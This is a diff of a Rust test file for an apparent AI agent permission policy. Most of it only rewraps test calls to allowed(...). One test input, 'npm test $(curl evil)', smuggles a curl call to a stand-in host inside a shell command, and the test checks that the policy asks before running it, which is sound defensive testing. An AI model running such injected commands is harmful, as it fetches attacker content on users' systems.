@@ -866,7 +866,10 @@ fn documents_change_only_through_the_document_tool() {
         &write(f.session_root.join("plan-snapshot/spec.md")),
     );
 
-    allowed(&explore, &document(f.session_dir.join("ostra-research-1-x.md")));
+    allowed(
+        &explore,
+        &document(f.session_dir.join("ostra-research-1-x.md")),
+    );
     assert_eq!(
         guard_of(&f.policy(AgentName::Plan), &document(&spec)),
         "artifact-ownership"
@@ -962,7 +965,10 @@ fn default_mode() {
     );
     allowed(
         &p,
-        &ToolCall::new("Other:ToolSearch", json!({"query": "select:mcp__ostra__memory"})),
+        &ToolCall::new(
+            "Other:ToolSearch",
+            json!({"query": "select:mcp__ostra__memory"}),
+        ),
     );
     assert!(
         is_ask(&p.check(&bash("npm test $(curl evil)"))),
